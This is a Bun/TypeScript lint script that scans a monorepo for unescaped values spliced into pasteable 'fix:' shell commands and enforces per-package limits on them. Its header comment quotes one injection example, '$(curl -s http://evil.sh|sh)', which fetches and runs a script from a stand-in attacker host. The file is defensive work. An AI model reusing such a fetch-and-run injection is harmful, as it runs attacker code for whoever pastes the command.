#!/usr/bin/env bun
// Enforce, as a ratchet, that a value spliced into a `fix:` line never lands in a SHELL COMMAND
// POSITION unscreened. A `fix:` is a command meant to be pasted, so a `${…}` after a command word
// is a value that RUNS.
//
// THE DEFECT THIS EXISTS FOR, in `@ultimat3/core`'s own words: `x g route /$(curl -s
// http://evil.sh|sh)` was the rendered fix for an unauthenticated `GET` against any unrouted path.
// `renderFixShellArg` (`packages/core/src/error-render.ts:210`) was written to close that one site
// and nothing has been watching the other hundred-odd — a value reaches a `fix:` from a URL, a
// header, a database row or a file on disk, and `renderFixLiteral` beside it is explicitly NOT the
// answer: it answers `JSON.stringify`, and `$(…)`, a backtick and `${…}` are all live inside double
// quotes in every POSIX shell.
//
// WHAT IT READS: the ORIGINAL text between the start of the line and the `${`. The mask blanks a
// template's TEXT, and the text is the whole question — `x g route ` in front of a substitution is
// what makes it an argument. Two positions count: an argument to a COMMAND WORD opening the
// segment, and a substitution sitting directly after `|`, `||`, `&&`, `;` or `$(`, where the value
// is the command.
//
// WHAT IT NEVER REPORTS: a substitution wrapped in `renderFixShellArg` / `renderFixLiteral` /
// `shellInertIdentifier` / `quoteArg`; anything after a `#`, which opens a shell comment; and prose
// carrying a command word, recognised by an em dash, a comma or a `(` between the word and the
// substitution — `x verify, then read ${detail}` is a sentence, and a rule that reds every sentence
// is a rule an agent switches off.
//
// WHAT IT CANNOT SEE: a `fix:` assembled by a helper that returns the string, a value laundered
// through a `const` two lines up, and a nested template inside a `${…}` — `maskLiterals` reads the
// inner backtick as the outer template's close, which `scripts/error-render.ts` already names as a
// gap belonging to `@ultimat3/cli`'s `ts-scan.ts`. A floor, not a proof.
//
//   bun run fix-shell-arg  ·  bun run scripts/fix-shell-arg.ts [--json] [--explain]
//   bun run scripts/fix-shell-arg.ts --unpin <pkg>[,<pkg>]   # shrink the ratchet

import { collectSourceFiles, type SourceFile } from './boundaries';
// One tokenizer, never two: `maskToCode` keeps a template's `${…}` bodies as code while blanking
// every literal's text, and `valueEnd` answers where a `fix:` value ends. A second copy here would
// be a second answer to the same question, and the two would disagree the day either was tuned.
import { maskToCode, valueEnd } from './error-render';
import { flagList, parseScriptArgs } from './lib/args';
import {
  applyFixShellArgUnpin,
  FIX_SHELL_ARG_PINS,
  FIX_SHELL_PINS_FILE,
  fixShellArgPinIsBlank,
  fixShellArgPinnedFor,
} from './lib/fix-shell-arg-pins';
import { commandPositionOf, isScreened } from './lib/fix-shell-arg-scan';
import type { Finding } from './lib/log';
import { report } from './lib/log';
import { repoRoot } from './lib/run';
import { isTestPath, lineOf } from './lib/source-scan';
import { packageOf } from './test-fix-citations';

const SCRIPT = 'fix-shell-arg';

/** Source the CLI EMITS rather than executes — a scaffolded app's own fix lines, not this tree's. */
const TEMPLATE_ROOT = 'packages/cli/src/templates/';

/** `fix:` as a property and `const fix =` as its assignment. The lookbehind rejects `e.fix`. */
const FIX_KEY = /(?<![.\w$])fix\s*[:=]\s*/g;

export interface FixShellArgSite {
  readonly path: string;
  readonly line: number;
  /** The substitution's own text, so the finding can quote it back. */
  readonly substitution: string;
  /** The command word it is an argument to, or `a shell operator`. */
  readonly command: string;
}

/** Every unscreened substitution in a command position in one file, in source order. */
export function scanFixShellArgs(path: string, source: string): readonly FixShellArgSite[] {
  const mask = maskToCode(source);
  const sites: FixShellArgSite[] = [];
  for (const key of mask.code.matchAll(FIX_KEY)) {
    const start = key.index + key[0].length;
    const end = valueEnd(mask.code, start);
    for (const one of mask.substitutions) {
      if (one.start < start || one.end > end) continue;
      const body = mask.code.slice(one.start, one.end);
      if (isScreened(body)) continue;
      // The ORIGINAL source, not the mask: the mask has blanked the template text that decides it.
      const opens = source.lastIndexOf('\n', one.start - 2) + 1;
      const command = commandPositionOf(source.slice(opens, one.start - 2));
      if (command === undefined) continue;
      sites.push({ path, line: lineOf(mask.code, one.start), substitution: body.trim(), command });
    }
  }
  return sites.sort((a, b) => a.line - b.line);
}

export type FixShellArgGapKind = 'over' | 'stale' | 'unscanned' | 'unexplained';

export interface FixShellArgGap {
  readonly kind: FixShellArgGapKind;
  readonly pkg: string;
  readonly found: number;
  readonly pinned: number;
  readonly first?: FixShellArgSite;
}

export interface FixShellArgInput {
  readonly sites: readonly FixShellArgSite[];
  readonly pins: Readonly<Record<string, { readonly count: number; readonly reason: string }>>;
  /** False means the scan read nothing, which must never read as a clean tree. */
  readonly scanned: boolean;
}

/** The ratchet: a package may hold what it is pinned at, may fall, may never rise. */
export function checkFixShellArgs(input: FixShellArgInput): readonly FixShellArgGap[] {
  if (!input.scanned) return [{ kind: 'unscanned', pkg: '', found: 0, pinned: 0 }];
  const found = new Map<string, FixShellArgSite[]>();
  for (const site of input.sites) {
    const list = found.get(packageOf(site.path)) ?? [];
    list.push(site);
    found.set(packageOf(site.path), list);
  }
  const gaps: FixShellArgGap[] = [];
  for (const pkg of new Set([...found.keys(), ...Object.keys(input.pins)])) {
    const hits = found.get(pkg) ?? [];
    const pinned = fixShellArgPinnedFor(pkg, input.pins);
    // A blank reason waives nothing, so the row is reported AND its count is not honoured —
    // reporting only the missing sentence would leave the sites silent behind it.
    if (fixShellArgPinIsBlank(pkg, input.pins)) {
      gaps.push({ kind: 'unexplained', pkg, found: hits.length, pinned });
    }
    if (hits.length > pinned) {
      gaps.push({
        kind: 'over',
        pkg,
        found: hits.length,
        pinned,
        ...(hits[0] === undefined ? {} : { first: hits[0] }),
      });
      continue;
    }
    if (hits.length < pinned) gaps.push({ kind: 'stale', pkg, found: hits.length, pinned });
  }
  return gaps.sort((a, b) => (a.pkg < b.pkg ? -1 : a.pkg > b.pkg ? 1 : 0));
}

const at = (site: FixShellArgSite | undefined): string =>
  site === undefined ? '' : `${site.path}:${String(site.line)}`;

const overFinding = (gap: FixShellArgGap): Finding => ({
  code: 'X_FIX_SHELL_ARG_UNSCREENED',
  cause: `${gap.pkg} splices ${String(gap.found)} value(s) into the command position of a fix: line and is pinned at ${String(gap.pinned)} — ${at(gap.first)} puts \${${gap.first?.substitution ?? ''}} after ${gap.first?.command ?? 'a command word'}, and a fix: is a command meant to be pasted, so a value carrying $(…), a backtick or a ; runs whatever it says`,
  fix: `wrap it: renderFixShellArg(${gap.first?.substitution ?? 'value'}, '<what a reader substitutes>') from @ultimat3/core, at ${at(gap.first)}; if the value cannot carry shell syntax, add ${gap.pkg} to FIX_SHELL_ARG_PINS in ${FIX_SHELL_PINS_FILE} with the sentence saying where it comes from`,
  at: at(gap.first),
});

const staleFinding = (gap: FixShellArgGap): Finding => ({
  code: 'X_FIX_SHELL_ARG_PIN_STALE',
  cause: `${gap.pkg} is pinned at ${String(gap.pinned)} unscreened fix: substitution(s) and has ${String(gap.found)} — the pin is above what this tree contains, so it would let ${String(gap.pinned - gap.found)} back in`,
  fix: `bun run scripts/fix-shell-arg.ts --unpin ${gap.pkg}`,
  at: FIX_SHELL_PINS_FILE,
});

const unexplainedFinding = (gap: FixShellArgGap): Finding => ({
  code: 'X_FIX_SHELL_ARG_PIN_UNEXPLAINED',
  cause: `${gap.pkg} is pinned with a blank reason, so nothing records where its ${String(gap.found)} spliced value(s) come from — a count with no sentence is the waiver axiom 3 refuses, and the pin holds nothing`,
  fix: `write where each remaining value in ${gap.pkg} comes from — a literal this process wrote, a name a schema parsed — in ${FIX_SHELL_PINS_FILE}; or wrap them in renderFixShellArg and run bun run scripts/fix-shell-arg.ts --unpin ${gap.pkg}`,
  at: FIX_SHELL_PINS_FILE,
});

const unscannedFinding = (): Finding => ({
  code: 'X_FIX_SHELL_ARG_UNSCANNED',
  cause:
    'no source file was read, so every package reports zero and the ratchet enforces nothing — a glob that matches nothing reads exactly like a tree with no spliced fix: value in it',
  fix: 'edit SOURCE_PATTERNS in scripts/boundaries.ts so it matches this repo layout, then bun run scripts/fix-shell-arg.ts',
  at: 'scripts/boundaries.ts',
});

/**
 * A `switch`, not the `Readonly<Record<Kind, …>>` table its twenty siblings use — deliberately, and
 * measured: `TABLE[gap.kind]` is a computed read of a `Record` object literal, which is exactly what
 * `bun run proto-index` refuses, and the two `scripts/` sites this file would have added were the
 * ones that took the package off its own ratchet. TypeScript's exhaustiveness gives the same build
 * error a ninth kind would get from the table, with no prototype to walk into.
 */
export const fixShellArgFindingFor = (gap: FixShellArgGap): Finding => {
  switch (gap.kind) {
    case 'over':
      return overFinding(gap);
    case 'stale':
      return staleFinding(gap);
    case 'unexplained':
      return unexplainedFinding(gap);
    case 'unscanned':
      return unscannedFinding();
  }
};

/** Shipped source, minus tests and minus the templates the CLI emits rather than runs. */
const shipped = (file: SourceFile): boolean =>
  !isTestPath(file.path) && !file.path.startsWith(TEMPLATE_ROOT);

export async function fixShellArgSites(root: string): Promise<{
  readonly sites: readonly FixShellArgSite[];
  readonly scanned: boolean;
}> {
  const files = (await collectSourceFiles(root)).filter(shipped);
  return {
    sites: files.flatMap((file) => scanFixShellArgs(file.path, file.source)),
    scanned: files.length > 0,
  };
}

export const fixShellArgGaps = async (root: string): Promise<readonly FixShellArgGap[]> => {
  const { sites, scanned } = await fixShellArgSites(root);
  return checkFixShellArgs({ sites, pins: FIX_SHELL_ARG_PINS, scanned });
};

/** What this rule contributes to `x verify`'s `errors` step, through `errorRendering`'s caller. */
export const fixShellArgFindings = async (root: string): Promise<readonly Finding[]> =>
  (await fixShellArgGaps(root)).map(fixShellArgFindingFor);

/** Every site per package, for `--unpin` and for the number a maintainer wants when lowering one. */
export async function fixShellArgCounts(root: string): Promise<Readonly<Record<string, number>>> {
  // A `Map`, not a `Record` accumulator: a package name is DATA, and `counts['constructor']` on an
  // object literal reads an `Object.prototype` member. Same reason as the `switch` above.
  const counts = new Map<string, number>();
  for (const site of (await fixShellArgSites(root)).sites) {
    const pkg = packageOf(site.path);
    counts.set(pkg, (counts.get(pkg) ?? 0) + 1);
  }
  return Object.fromEntries(counts);
}

if (import.meta.main) {
  const args = parseScriptArgs(Bun.argv.slice(2));
  const root = repoRoot();
  const unpin = flagList(args, 'unpin');
  if (unpin.length > 0) {
    const lowered = await applyFixShellArgUnpin(root, unpin, await fixShellArgCounts(root));
    report(
      {
        ok: true,
        script: SCRIPT,
        summary:
          lowered.length === 0
            ? 'nothing to lower — every named package is already at what this tree measures'
            : `lowered ${String(lowered.length)} pin(s): ${lowered.join(', ')}`,
        findings: [],
      },
      args.json,
    );
  } else {
    const { sites, scanned } = await fixShellArgSites(root);
    const gaps = checkFixShellArgs({ sites, pins: FIX_SHELL_ARG_PINS, scanned });
    report(
      {
        ok: gaps.length === 0,
        script: SCRIPT,
        summary:
          gaps.length === 0
            ? `${String(sites.length)} fix: substitution(s) in a shell command position, every package at or under its pin`
            : `${String(gaps.length)} package(s) off the fix-shell-argument ratchet`,
        findings: gaps.map(fixShellArgFindingFor),
        data: {
          counts: await fixShellArgCounts(root),
          ...(args.flags.get('explain') === true ? { sites } : {}),
        },
      },
      args.json,
    );
  }
}
